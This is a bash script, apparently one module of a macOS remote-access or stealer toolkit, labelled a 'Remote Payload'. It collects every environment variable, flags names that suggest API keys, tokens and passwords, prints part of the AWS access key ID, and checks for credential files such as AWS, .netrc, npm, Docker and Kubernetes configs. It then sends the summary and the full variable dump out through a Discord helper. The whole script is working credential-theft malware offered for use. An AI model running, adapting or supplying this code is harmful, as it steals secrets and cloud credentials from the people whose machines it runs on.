#!/bin/bash
# ============================================================
# Environment Variables for macOS - Modular Remote Payload
# ============================================================
# Extracts environment variables (may contain secrets)
# ============================================================

SYSID=$(get_sysid)
OUTPUT="🔐 **Environment Variables from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

TMPFILE="/tmp/env_$SYSID.txt"

# Get all environment variables
env | sort > "$TMPFILE"

# Look for interesting variables
OUTPUT+="**🔍 INTERESTING VARIABLES**\n"

# API keys and tokens
env | grep -iE "(api|key|token|secret|password|auth|credential)" | while read line; do
    VAR_NAME=$(echo "$line" | cut -d= -f1)
    OUTPUT+="• \`$VAR_NAME\` = (found)\n"
done

# AWS
if [[ -n "$AWS_ACCESS_KEY_ID" ]]; then
    OUTPUT+="• AWS_ACCESS_KEY_ID: \`${AWS_ACCESS_KEY_ID:0:10}...\`\n"
fi
if [[ -n "$AWS_SECRET_ACCESS_KEY" ]]; then
    OUTPUT+="• AWS_SECRET_ACCESS_KEY: \`(present)\`\n"
fi

# Common paths
OUTPUT+="\n**📁 PATHS**\n"
OUTPUT+="• HOME: \`$HOME\`\n"
OUTPUT+="• PATH: \`${PATH:0:100}...\`\n"
OUTPUT+="• SHELL: \`$SHELL\`\n"

# Check for credential files
OUTPUT+="\n**📄 CREDENTIAL FILES**\n"
[[ -f "$HOME/.aws/credentials" ]] && OUTPUT+="• AWS credentials: ✅\n"
[[ -f "$HOME/.netrc" ]] && OUTPUT+="• .netrc: ✅\n"
[[ -f "$HOME/.npmrc" ]] && OUTPUT+="• .npmrc: ✅\n"
[[ -f "$HOME/.docker/config.json" ]] && OUTPUT+="• Docker config: ✅\n"
[[ -f "$HOME/.kube/config" ]] && OUTPUT+="• Kubernetes config: ✅\n"
[[ -f "$HOME/.gitconfig" ]] && OUTPUT+="• Git config: ✅\n"

# Send summary + full file
send_discord "$OUTPUT" "$TMPFILE"
rm -f "$TMPFILE"

